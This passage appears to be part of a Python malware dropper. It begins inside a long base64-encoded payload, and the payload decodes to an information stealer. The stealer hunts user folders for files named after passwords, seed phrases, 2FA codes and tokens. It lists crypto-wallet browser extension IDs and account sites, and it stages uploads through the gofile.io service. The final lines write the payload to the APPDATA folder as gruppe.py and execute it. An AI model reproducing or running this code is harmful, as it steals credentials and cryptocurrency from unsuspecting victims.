xKCk6CiAgICB1c2VyID0gdGVtcC5zcGxpdCgiXEFwcERhdGEiKVswXQogICAgcGF0aDJzZWFyY2ggPSBbCiAgICAgICAgdXNlciAgICArICIvRGVza3RvcCIsCiAgICAgICAgdXNlciAgICArICIvRG93bmxvYWRzIiwKICAgICAgICB1c2VyICAgICsgIi9Eb2N1bWVudHMiLAogICAgICAgIHJvYW1pbmcgKyAiL01pY3Jvc29mdC9XaW5kb3dzL1JlY2VudCIsCiAgICBdCgogICAga2V5X3dvcmRzRmlsZXMgPSBbCiAgICAgICAgInBhc3N3IiwKICAgICAgICAibWRwIiwKICAgICAgICAibW90ZGVwYXNzZSIsCiAgICAgICAgIm1vdF9kZV9wYXNzZSIsCiAgICAgICAgImxvZ2luIiwKICAgICAgICAic2VjcmV0IiwKICAgICAgICAiYm90IiwKICAgICAgICAiYXRvbWljIiwKICAgICAgICAiYWNjb3VudCIsCiAgICAgICAgImFjb3VudCIsCiAgICAgICAgInBheXBhbCIsCiAgICAgICAgImJhbnF1ZSIsCiAgICAgICAgImJvdCIsCiAgICAgICAgIm1ldGFtYXNrIiwKICAgICAgICAid2FsbGV0IiwKICAgICAgICAiY3J5cHRvIiwKICAgICAgICAiZXhvZHVzIiwKICAgICAgICAiZGlzY29yZCIsCiAgICAgICAgIjJmYSIsCiAgICAgICAgImNvZGUiLAogICAgICAgICJtZW1vIiwKICAgICAgICAiY29tcHRlIiwKICAgICAgICAidG9rZW4iLAogICAgICAgICJiYWNrdXAiLAogICAgICAgICJzZWNyZXQiLAogICAgICAgICJzZWVkIiwKICAgICAgICAibW5lbW9uaWMiCiAgICAgICAgIm1lbW9yaWMiLAogICAgICAgICJwcml2YXRlIiwKICAgICAgICAia2V5IiwKICAgICAgICAicGFzc3BocmFzZSIsCiAgICAgICAgInBhc3MiLAogICAgICAgICJwaHJhc2UiLAogICAgICAgICJzdGVhbCIsCiAgICAgICAgImJhbmsiLAogICAgICAgICJpbmZvIiwKICAgICAgICAiY2FzaW5vIiwKICAgICAgICAicHJ2IiwKICAgICAgICAicHJpdsOpIiwKICAgICAgICAicHJpdmUiLAogICAgICAgICJ0ZWxlZ3JhbSIsCiAgICAgICAgImlkZW50aWZpYW50IiwKICAgICAgICAicGVyc29ubmVsIiwKICAgICAgICAidHJhZGluZyIKICAgICAgICAiYml0Y29pbiIsCiAgICAgICAgInNhdXZlZ2FyZGUiLAogICAgICAgICJmdW5kcyIsCiAgICAgICAgInLDqWN1cMOpIiwKICAgICAgICAicmVjdXAiLAogICAgICAgICJub3RlIiwKICAgIF0KICAgCiAgICB3aWtpdGggPSBbXQogICAgZm9yIHBhdHQgaW4gcGF0aDJzZWFyY2g6IAogICAgICAgIGtpd2kgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1LMVcxRjExMywgYXJncz1bcGF0dCwga2V5X3dvcmRzRmlsZXNdKQogICAgICAgIGtpd2kuc3RhcnQoKQogICAgICAgIHdpa2l0aC5hcHBlbmQoa2l3aSkKICAgIHJldHVybiB3aWtpdGgKCmRlZiBmaWxlc3RlYWxyKCk6CiAgICB3aWtpdGggPSBLMVcxKCkKCiAgICBmb3IgdGhyZWFkIGluIHdpa2l0aDogdGhyZWFkLmpvaW4oKQogICAgdGltZS5zbGVlcCgwLjIpCgogICAgZmlsZXRleHQgPSAiXG4iCiAgICBmb3IgYXJnIGluIEsxVzFGMTEzczoKICAgICAgICBpZiBsZW4oYXJnWzJdKSAhPSAwOgogICAgICAgICAgICBmb2xkcGF0aCA9IGFyZ1sxXS5yZXBsYWNlKCJcXCIsICIvIikKICAgICAgICAgICAgZm9sZGxpc3QgPSBhcmdbMl0KICAgICAgICAgICAgZmlsZXRleHQgKz0gZiLwn5OBIHtmb2xkcGF0aH1cbiIKCiAgICAgICAgICAgIGZvciBmZmlsIGluIGZvbGRsaXN0OgogICAgICAgICAgICAgICAgYSA9IGZmaWxbMF0uc3BsaXQoIi8iKQogICAgICAgICAgICAgICAgZmlsZWFubWUgPSBhW2xlbihhKS0xXQogICAgICAgICAgICAgICAgYiA9IGZmaWxbMV0KICAgICAgICAgICAgICAgIGZpbGV0ZXh0ICs9IGYi4pSU4pSAPDpvcGVuZm9sZGVyOjExMTE0MDgyODYzMzIzNzUwNDA+IFt7ZmlsZWFubWV9XSh7Yn0pXG4iCiAgICAgICAgICAgIGZpbGV0ZXh0ICs9ICJcbiIKICAgIFVQMTA0RCgia2l3aSIsIGZpbGV0ZXh0KQoKZ2xvYmFsIGszWVcwcmQsIGMwMEsxVzByRHMsIHA0NVdXMHJEcywgQzAwSzFDMFVOdCwgUDQ1NVdDMFVOdCwgVzQxMTM3NVoxcCwgRzRNMU42WjFwLCBPN0gzcloxcCwgVEhyMzREMTE1NwoKREVURUNURUQgPSBGYWxzZQp3NDExMzc1ID0gWwogICAgWyJua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubiIsICJNZXRhbWFzayIgICAgICAgICBdLAogICAgWyJlamJhbGJha29wbGNobGdoZWNkYWxtZWVlYWpuaW1obSIsICJNZXRhbWFzayIgICAgICAgICBdLAogICAgWyJmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcCIsICJCaW5hbmNlIiAgICAgICAgICBdLAogICAgWyJobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZCIsICJDb2luYmFzZSIgICAgICAgICBdLAogICAgWyJmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlYyIsICJSb25pbiIgICAgICAgICAgICBdLAogICAgWyJlZ2ppZGpicGdsaWNoZGNvbmRiY2JkbmJlZXBwZ2RwaCIsICJUcnVzdCIgICAgICAgICAgICBdLAogICAgWyJvamdnbWNobGdobmpsYXBtZmJuamhvbGZqa2lpZGJjaCIsICJWZW5vbSIgICAgICAgICAgICBdLAogICAgWyJvcGNncGZtaXBpZGJncGVuaG1ham9hanBib2JwcGRpbCIsICJTdWkiICAgICAgICAgICAgICBdLAogICAgWyJlZmJnbGdvZm9pcHBiZ2NqZXBuaGlibGFpYmNuY2xnayIsICJNYXJ0aWFuIiAgICAgICAgICBdLAogICAgWyJpYm5lamRmam1ta3BjbmxwZWJrbG1ua29lb2lob2ZlYyIsICJUcm9uIiAgICAgICAgICAgICBdLAogICAgWyJlampsYWRpbm5ja2RnamVtZWtlYmRwZW9rYmlraGZjaSIsICJQZXRyYSIgICAgICAgICAgICBdLAogICAgWyJwaGtiYW1lZmluZ2dtYWtna2xwa2xqam1naWJvaG5iYSIsICJQb250ZW0iICAgICAgICAgICBdLAogICAgWyJlYmZpZHBwbGhhYmVlZHBuaGpub2JnaG9rcGlpb29saiIsICJGZXdjaGEiICAgICAgICAgICBdLAogICAgWyJhZmJjYmpwYnBmYWRsa21obWNsaGtlZW9kbWFtY2ZsYyIsICJNYXRoIiAgICAgICAgICAgICBdLAogICAgWyJhZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZyIsICJDb2luOTgiICAgICAgICAgICBdLAogICAgWyJiaGdob2FtYXBjZHBib2hwaGlnb29vYWRkaW5wa2JhaSIsICJBdXRoZW50aWNhdG9yIiAgICBdLAogICAgWyJhaG9scGZkaWFsamdqZmhvbWloa2pibWdqaWRsY2RubyIsICJFeG9kdXNXZWIzIiAgICAgICBdLAogICAgWyJiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYSIsICJQaGFudG9tIiAgICAgICAgICBdLAogICAgWyJhZ29ha2ZlamphYm9tZW1wa2psZXBkZmxhbGVlb2JoYiIsICJDb3JlIiAgICAgICAgICAgICBdLAogICAgWyJtZmdjY2pjaGloZmtraW5kZnBwbmFvb2VjZ2ZuZWlpaSIsICJUb2tlbnBvY2tldCIgICAgICBdLAogICAgWyJsZ21wY3BnbHBuZ2RvYWxiZ2VvbGRlYWpmY2xuaGFmYSIsICJTYWZlcGFsIiAgICAgICAgICBdLAogICAgWyJiaGhobGJlcGRrYmFwYWRqZG5ub2prYmdpb2lvZGJpYyIsICJTb2xmYXJlIiAgICAgICAgICBdLAogICAgWyJqYmxuZGxpcGVvZ3BhZm5sZGhnbWFwYWdjY2NmY2hwaSIsICJLYWlrYXMiICAgICAgICAgICBdLAogICAgWyJrbmNjaGRpZ29iZ2hlbmJiYWRkb2pqbm5hb2dmcHBmaiIsICJpV2FsbGV0IiAgICAgICAgICBdLAogICAgWyJmZm5iZWxmZG9laW9oZW5ramlibm1hZGppZWhqaGFqYiIsICJZb3JvaSIgICAgICAgICAgICBdLAogICAgWyJocGdsZmhnZm5oYmdwamRlbmpnbWRnb2VpYXBwYWZsbiIsICJHdWFyZGEiICAgICAgICAgICBdLAogICAgWyJjamVsZnBscGxlYmRqamVubGxwamNibG1qa2ZjZmZuZSIsICJKYXh4IExpYmVydHkiICAgICBdLAogICAgWyJhbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaCIsICJXb21iYXQiICAgICAgICAgICBdLAogICAgWyJmaGlsYWhlaW1nbGlnbmRka2pnb2ZrY2JnZWtoZW5iaCIsICJPeHlnZW4iICAgICAgICAgICBdLAogICAgWyJubGJtbm5pamNubGVna2pqcGNmamNsbWNmZ2dmZWZkbSIsICJNRVdDWCIgICAgICAgICAgICBdLAogICAgWyJuYW5qbWRrbmhraW5pZm5rZ2RjZ2djZm5oZGFhbW1taiIsICJHdWlsZCIgICAgICAgICAgICBdLAogICAgWyJua2RkZ25jZGpnamZjZGRhbWZnY21mbmxoY2NuaW1pZyIsICJTYXR1cm4iICAgICAgICAgICBdLCAKICAgIFsiYWlpZmJuYmZvYnBtZWVraXBoZWVpamltZHBubHBncHAiLCAiVGVycmFTdGF0aW9uIiAgICAgXSwKICAgIFsiZm5uZWdwaGxvYmpkcGtoZWNhcGtpampka2djamhraWIiLCAiSGFybW9ueU91dGRhdGVkIiAgXSwKICAgIFsiY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmsiLCAiRXZlciIgICAgICAgICAgICAgXSwKICAgIFsicGRhZGprZmtnY2FmZ2JjZWltY3Bia2FsbmZuZXBibmsiLCAiS2FyZGlhQ2hhaW4iICAgICAgXSwKICAgIFsibWdmZmtmYmlkaWhqcG9hb21hamxiZ2NoZGRsaWNncG4iLCAiUGFsaVdhbGxldCIgICAgICAgXSwKICAgIFsiYW9ka2thZ25hZGNib2JmcGdnZm5qZW9uZ2VtamJqY2EiLCAiQm9sdFgiICAgICAgICAgICAgXSwKICAgIFsia3Bmb3BrZWxtYXBjb2lwZW1mZW5kbWRjZ2huZWdpbW4iLCAiTGlxdWFsaXR5IiAgICAgICAgXSwKICAgIFsiaG1lb2JuZm5mY21ka2RjbWxibGdhZ21mcGZib2llYWYiLCAiWERFRkkiICAgICAgICAgICAgXSwKICAgIFsibHBmY2Jqa25panBlZWlsbGlmbmtpa2duY2lrZ2ZoZG8iLCAiTmFtaSIgICAgICAgICAgICAgXSwKICAgIFsiZG5nbWxibGNvZGZvYnBkcGVjYWFkZ2ZiY2dnZmpmbm0iLCAiTWFpYXJERUZJIiAgICAgICAgXSwKICAgIFsib29ramxia2lpamluaHBtbmpmZmNvZmpvbmJmYmdhb2MiLCAiVGVtcGxlVGV6b3MiICAgICAgXSwKICAgIFsiZWlnYmxiZ2prbmxmYmFqa2Zob3BtY29qaWRsZ2NlaG0iLCAiWE1SLlBUIiAgICAgICAgICAgXSwKXQpJUCA9IEczNzFQKCkKbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikKCmszWVcwcmQgPSBbJ1tjb2luYmFzZV0oaHR0cHM6Ly9jb2luYmFzZS5jb20pJywgJ1tzZWxsaXhdKGh0dHBzOi8vc2VsbGl4LmlvKScsICdbZ21haWxdKGh0dHBzOi8vZ21haWwuY29tKScsICdbc3RlYW1dKGh0dHBzOi8vc3RlYW0uY29tKScsICdbZGlzY29yZF0oaHR0cHM6Ly9kaXNjb3JkLmNvbSknLCAnW3Jpb3RnYW1lc10oaHR0cHM6Ly9yaW90Z2FtZXMuY29tKScsICdbeW91dHViZV0oaHR0cHM6Ly95b3V0dWJlLmNvbSknLCAnW2luc3RhZ3JhbV0oaHR0cHM6Ly9pbnN0YWdyYW0uY29tKScsICdbdGlrdG9rXShodHRwczovL3Rpa3Rvay5jb20pJywgJ1t0d2l0dGVyXShodHRwczovL3R3aXR0ZXIuY29tKScsICdbZmFjZWJvb2tdKGh0dHBzOi8vZmFjZWJvb2suY29tKScsICdbZXBpY2dhbWVzXShodHRwczovL2VwaWNnYW1lcy5jb20pJywgJ1tzcG90aWZ5XShodHRwczovL3Nwb3RpZnkuY29tKScsICdbeWFob29dKGh0dHBzOi8veWFob28uY29tKScsICdbcm9ibG94XShodHRwczovL3JvYmxveC5jb20pJywgJ1t0d2l0Y2hdKGh0dHBzOi8vdHdpdGNoLmNvbSknLCAnW21pbmVjcmFmdF0oaHR0cHM6Ly9taW5lY3JhZnQubmV0KScsICdbcGF5cGFsXShodHRwczovL3BheXBhbC5jb20pJywgJ1tvcmlnaW5dKGh0dHBzOi8vb3JpZ2luLmNvbSknLCAnW2FtYXpvbl0oaHR0cHM6Ly9hbWF6b24uY29tKScsICdbZWJheV0oaHR0cHM6Ly9lYmF5LmNvbSknLCAnW2FsaWV4cHJlc3NdKGh0dHBzOi8vYWxpZXhwcmVzcy5jb20pJywgJ1twbGF5c3RhdGlvbl0oaHR0cHM6Ly9wbGF5c3RhdGlvbi5jb20pJywgJ1toYm9dKGh0dHBzOi8vaGJvLmNvbSknLCAnW3hib3hdKGh0dHBzOi8veGJveC5jb20pJywgJ1tiaW5hbmNlXShodHRwczovL2JpbmFuY2UuY29tKScsICdbaG90bWFpbF0oaHR0cHM6Ly9ob3RtYWlsLmNvbSknLCAnW291dGxvb2tdKGh0dHBzOi8vb3V0bG9vay5jb20pJywgJ1tjcnVuY2h5cm9sbF0oaHR0cHM6Ly9jcnVuY2h5cm9sbC5jb20pJywgJ1t0ZWxlZ3JhbV0oaHR0cHM6Ly90ZWxlZ3JhbS5jb20pJywgJ1twb3JuaHViXShodHRwczovL3Bvcm5odWIuY29tKScsICdbZGlzbmV5XShodHRwczovL2Rpc25leS5jb20pJywgJ1tleHByZXNzdnBuXShodHRwczovL2V4cHJlc3N2cG4uY29tKScsICdbdWJlcl0oaHR0cHM6Ly91YmVyLmNvbSknLCAnW25ldGZsaXhdKGh0dHBzOi8vbmV0ZmxpeC5jb20pJywgJ1tnaXRodWJdKGh0dHBzOi8vZ2l0aHViLmNvbSknLCAnW3N0YWtlXShodHRwczovL3N0YWtlLmNvbSknXQpDMDBLMUMwVU50LCBQNDU1V0MwVU50LCBDQzVDMFVOdCwgQVU3MEYxMTFDMFVOdCwgSDE1NzByWUMwVU50LCBCMDBLTTRySzVDMFVOdCA9IDAsIDAsIDAsIDAsIDAsIDAKYzAwSzFXMHJEcywgcDQ1V1cwckRzLCBIMTU3MHJZLCBDQ3MsIFA0NTV3LCBBVTcwRjExbCwgQzAwSzEzcywgVzQxMTM3NVoxcCwgRzRNMU42WjFwLCBPN0gzcloxcCwgVEhyMzREMTE1NywgSzFXMUYxMTNzLCBCMDBLTTRySzUsIFQwSzNOcyA9IFtdLCBbXSwgW10sIFtdLCBbXSwgW10sIFtdLCBbXSwgW10sIFtdLCBbXSwgW10sIFtdLCAnJwoKdHJ5OmdvZmlsZXNlcnZlciA9IGxvYWRzKHVybG9wZW4oImh0dHBzOi8vYXBpLmdvZmlsZS5pby9nZXRTZXJ2ZXIiKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpKVsiZGF0YSJdWyJzZXJ2ZXIiXQpleGNlcHQ6Z29maWxlc2VydmVyID0gInN0b3JlNCIKR0xJTkZPID0gRzEwODQxMU5GMCgpCgoKRzQ3SDNyNDExKCkKd2lraXRoID0gSzFXMSgpCgpmb3IgdGhyZWFkIGluIHdpa2l0aDogdGhyZWFkLmpvaW4oKQp0aW1lLnNsZWVwKDAuMikKCmZpbGV0ZXh0ID0gIlxuIgpmb3IgYXJnIGluIEsxVzFGMTEzczoKICAgIGlmIGxlbihhcmdbMl0pICE9IDA6CiAgICAgICAgZm9sZHBhdGggPSBhcmdbMV0KICAgICAgICBmb2xkbGlzdCA9IGFyZ1syXSAgICAgICAKICAgICAgICBmaWxldGV4dCArPSBmIjw6b3BlbmZvbGRlcjoxMTExNDA4Mjg2MzMyMzc1MDQwPiB7Zm9sZHBhdGh9XG4iCgogICAgICAgIGZvciBmZmlsIGluIGZvbGRsaXN0OgogICAgICAgICAgICBhID0gZmZpbFswXS5zcGxpdCgiLyIpCiAgICAgICAgICAgIGZpbGVhbm1lID0gYVtsZW4oYSktMV0KICAgICAgICAgICAgYiA9IGZmaWxbMV0KICAgICAgICAgICAgZmlsZXRleHQgKz0gZiLilJTilIA8Om9wZW5mb2xkZXI6MTExMTQwODI4NjMzMjM3NTA0MD4gW3tmaWxlYW5tZX1dKHtifSlcbiIKICAgICAgICBmaWxldGV4dCArPSAiXG4iClVQMTA0RCgia2l3aSIsIGZpbGV0ZXh0KQ=="))
"""
gruppe_path = os.path.join(os.getenv('APPDATA'), 'gruppe.py')

with open(gruppe_path, 'w') as file:
    file.write(content)

os.system(sys.executable + " " + gruppe_path)
